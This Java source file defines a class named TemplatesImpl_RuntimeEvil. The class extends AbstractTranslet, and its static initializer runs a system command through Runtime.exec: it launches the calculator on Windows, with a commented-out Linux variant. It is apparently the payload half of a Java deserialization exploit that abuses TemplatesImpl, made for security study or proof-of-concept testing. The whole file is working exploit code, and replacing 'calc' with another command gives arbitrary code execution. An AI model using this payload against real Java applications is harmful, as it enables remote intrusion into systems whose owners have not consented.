import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class TemplatesImpl_RuntimeEvil extends AbstractTranslet {
    static{
        try {
            Runtime.getRuntime().exec("calc");//windows
//            Runtime.getRuntime().exec("gnome-calculator &");//linux
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public TemplatesImpl_RuntimeEvil(){}
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
